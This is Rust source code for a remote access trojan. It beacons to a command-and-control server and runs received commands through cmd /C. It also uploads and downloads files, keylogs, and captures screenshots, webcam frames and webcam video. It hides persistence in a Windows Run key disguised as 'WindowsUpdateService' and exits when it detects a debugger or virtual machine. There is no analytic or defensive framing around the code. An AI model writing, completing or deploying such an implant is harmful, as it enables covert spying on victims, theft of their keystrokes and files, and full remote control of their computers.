use std::fs;
use std::path::Path;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::sleep;
use serde::{Deserialize, Serialize};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::aead::{Aead, KeyInit};
use rand::Rng;
use rdev::{listen, Event, EventType, Key as RdevKey};
use std::io::Read;
use std::sync::{Arc, Mutex};
use winreg::RegKey;
use winreg::enums::HKEY_CURRENT_USER;
use scrap::{Capturer, Display};
use nokhwa::{Camera, utils::{CameraIndex, RequestedFormat, RequestedFormatType}, pixel_format::RgbFormat};

const ENCRYPTION_KEY: [u8; 32] = [
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
];

const C2_HOST: &str = "127.0.0.1";
const C2_PORT: u16 = 7878;

#[derive(Serialize, Deserialize)]
enum Command {
    Shell(String),
    Download(String),
    Upload { filename: String, data: Vec<u8> },
    Keylog,
    Screenshot,
    Webcam,
    WebcamStream,
    Exit,
}

#[derive(Serialize, Deserialize)]
enum Response {
    Success(String),
    Data { data: Vec<u8>, kind: String },
    Error(String),
}

fn encrypt(data: &[u8]) -> Vec<u8> {
    let key = Key::<Aes256Gcm>::from_slice(&ENCRYPTION_KEY);
    let cipher = Aes256Gcm::new(&key);
    let nonce_bytes = rand::thread_rng().gen::<[u8; 12]>();
    let nonce = Nonce::from_slice(&nonce_bytes);

    let ciphertext = cipher.encrypt(nonce, data).unwrap();
    let mut result = nonce_bytes.to_vec();
    result.extend(ciphertext);
    result
}

fn decrypt(data: &[u8]) -> Result<Vec<u8>, String> {
    if data.len() < 12 {
        return Err("Data too short".to_string());
    }
    let key = Key::<Aes256Gcm>::from_slice(&ENCRYPTION_KEY);
    let cipher = Aes256Gcm::new(&key);
    let (nonce_bytes, ciphertext) = data.split_at(12);
    let nonce = Nonce::from_slice(nonce_bytes);

    cipher.decrypt(nonce, ciphertext).map_err(|_| "Decryption failed".to_string())
}

fn persistence() {
    if cfg!(windows) {
        let exe_path = std::env::current_exe().unwrap();
        let exe_str = exe_path.to_str().unwrap();
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let path = r"Software\Microsoft\Windows\CurrentVersion\Run";
        if let Ok((key, _)) = hkcu.create_subkey(path) {
            let _ = key.set_value("WindowsUpdateService", &exe_str);
        }
    }
}

fn capture_screenshot() -> Vec<u8> {
    let display = Display::primary().unwrap();
    let mut capturer = Capturer::new(display).unwrap();
    let frame = capturer.frame().unwrap();
    frame.to_vec()
}

fn capture_webcam() -> Vec<u8> {
    let index = CameraIndex::Index(0);
    let format = RequestedFormat::new::<RgbFormat>(RequestedFormatType::AbsoluteHighestResolution);
    let mut camera = Camera::new(index, format).unwrap();
    camera.open_stream().unwrap();
    let frame = camera.frame().unwrap();
    camera.stop_stream().unwrap();
    frame.buffer().to_vec()
}

fn is_vm() -> bool {
    #[cfg(windows)]
    {
        use winreg::RegKey;
        use winreg::enums::HKEY_LOCAL_MACHINE;
        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        if let Ok(key) = hklm.open_subkey("HARDWARE\\DESCRIPTION\\System") {
            if let Ok(bios) = key.get_value::<String, _>("SystemBiosVersion") {
                if bios.contains("VMware") || bios.contains("VirtualBox") || bios.contains("QEMU") {
                    return true;
                }
            }
        }
    }
    false
}

fn keylogger_thread(tx: std::sync::mpsc::Sender<String>) {
    let callback = move |event: Event| {
        if let EventType::KeyPress(key) = event.event_type {
            let key_str = match key {
                RdevKey::Return => "\n".to_string(),
                RdevKey::Space => " ".to_string(),
                RdevKey::Backspace => "[BACK]".to_string(),
                _ => format!("{:?}", key),
            };
            let _ = tx.send(key_str);
        }
    };
    let _ = listen(callback);
}

async fn handle_connection(mut stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
    let (mut reader, mut writer) = stream.split();
    let keylog_data = Arc::new(Mutex::new(String::new()));
    let (tx, rx) = std::sync::mpsc::channel();

    // Start keylogger in separate thread
    std::thread::spawn(move || keylogger_thread(tx));

    // Collect keylog from channel
    let keylog_data_clone = Arc::clone(&keylog_data);
    std::thread::spawn(move || {
        while let Ok(key) = rx.recv() {
            let mut data = keylog_data_clone.lock().unwrap();
            data.push_str(&key);
        }
    });

    loop {
        let mut buf = vec![0; 4096];
        match reader.read(&mut buf).await {
            Ok(0) => break, // connection closed
            Ok(n) => {
                let encrypted = &buf[..n];
                if let Ok(decrypted) = decrypt(encrypted) {
                    if let Ok(cmd) = serde_json::from_slice::<Command>(&decrypted) {
                        let response = match cmd {
                            Command::Shell(cmd_str) => {
                                // Use direct syscalls for anti-AV
                                // For now, use std::process
                                let output = std::process::Command::new("cmd")
                                    .args(["/C", &cmd_str])
                                    .output();
                                match output {
                                    Ok(out) => {
                                        let result = if out.status.success() {
                                            String::from_utf8_lossy(&out.stdout).to_string()
                                        } else {
                                            String::from_utf8_lossy(&out.stderr).to_string()
                                        };
                                        Response::Success(result)
                                    }
                                    Err(e) => Response::Error(e.to_string()),
                                }
                            }
                            Command::Download(filename) => {
                                if Path::new(&filename).exists() {
                                    if let Ok(mut file) = std::fs::File::open(&filename) {
                                        let mut data = Vec::new();
                                        file.read_to_end(&mut data).ok();
                                        Response::Data { data, kind: "download".to_string() }
                                    } else {
                                        Response::Error("Cannot open file".to_string())
                                    }
                                } else {
                                    Response::Error("File not found".to_string())
                                }
                            }
                            Command::Upload { filename, data } => {
                                let _ = fs::write(&filename, data);
                                Response::Success("Upload successful".to_string())
                            }
                            Command::Keylog => {
                                let data = keylog_data.lock().unwrap();
                                Response::Success(data.clone())
                            }
                            Command::Screenshot => Response::Data { data: capture_screenshot(), kind: "screenshot".to_string() },
                            Command::Webcam => Response::Data { data: capture_webcam(), kind: "webcam".to_string() },
                            Command::WebcamStream => {
                                let temp_dir = "temp_webcam";
                                std::fs::create_dir_all(temp_dir).ok();
                                for i in 0..10 {
                                    let data = capture_webcam();
                                    let filename = format!("{}/frame_{:02}.png", temp_dir, i);
                                    std::fs::write(&filename, &data).ok();
                                    tokio::time::sleep(tokio::time::Duration::from_millis(200)).await;
                                }
                                let output_file = "webcam_stream.mp4";
                                let ffmpeg_result = std::process::Command::new("ffmpeg")
                                    .args(["-y", "-i", &format!("{}/frame_%02d.png", temp_dir), "-c:v", "libx264", "-pix_fmt", "yuv420p", output_file])
                                    .output();
                                if ffmpeg_result.is_ok() {
                                    if let Ok(video_data) = std::fs::read(output_file) {
                                        std::fs::remove_file(output_file).ok();
                                        std::fs::remove_dir_all(temp_dir).ok();
                                        Response::Data { data: video_data, kind: "webcam_video".to_string() }
                                    } else {
                                        std::fs::remove_dir_all(temp_dir).ok();
                                        Response::Error("Failed to read video file".to_string())
                                    }
                                } else {
                                    std::fs::remove_dir_all(temp_dir).ok();
                                    Response::Error("FFmpeg encoding failed".to_string())
                                }
                            }
                            Command::Exit => break,
                        };
                        let json_resp = serde_json::to_vec(&response).unwrap();
                        let encrypted_resp = encrypt(&json_resp);
                        writer.write_all(&encrypted_resp).await.ok();
                    }
                }
            }
            Err(_) => break,
        }
    }
    Ok(())
}

#[tokio::main]
async fn main() {
    persistence(); // Set persistence immediately

    #[cfg(windows)]
    {
        use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
        if unsafe { IsDebuggerPresent() }.as_bool() {
            std::process::exit(0);
        }
    }
    if is_vm() {
        std::process::exit(0);
    }

    loop {
        match TcpStream::connect((C2_HOST, C2_PORT)).await {
            Ok(stream) => {
                println!("[+] Connected to C2 successfully");
                if handle_connection(stream).await.is_ok() {
                    // Normal close
                }
            }
            Err(_) => {
                println!("[-] Connection failed, waiting 10 seconds...");
            }
        }
        sleep(Duration::from_secs(10)).await;
    }
}